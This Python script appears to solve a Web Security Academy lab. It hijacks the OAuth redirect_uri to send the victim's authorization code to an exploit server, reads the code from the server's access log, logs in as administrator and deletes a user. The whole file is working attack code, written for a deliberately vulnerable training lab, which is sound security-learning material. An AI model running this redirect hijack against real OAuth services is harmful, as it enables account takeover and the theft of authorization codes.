from web_security_academy.core.logger import logger
from web_security_academy.core.utils import generate_csrf_html

from bs4 import BeautifulSoup
from requests import Request

import re


def solve_lab(session):
    # Extract social media URL
    resp = session.get_path("/social-login")
    soup = BeautifulSoup(resp.text, "lxml")
    meta = soup.select_one('meta[http-equiv="refresh"]')
    ouath_url = meta.get("content")[6:]
    logger.info("Extracted social media login URL")

    # Perform CSRF to send authorization code to exploit server
    exploit_server = session.exploit_server()
    ouath_url = ouath_url.replace(
        session.url, exploit_server.url + "/"
    )  # Sets redirect_uri to exploit server
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    body = generate_csrf_html(Request("GET", ouath_url))
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)

    # Use authorization code to log in as administrator
    log = exploit_server.access_log()
    auth_code = re.search(r"/oauth-callback\?code=([^ ]+)", log).group(1)
    logger.info(f"Extracted authentication code: {auth_code}")
    session.get_path("/oauth-callback", params={"code": auth_code})
    logger.info("Logged in as administrator")

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
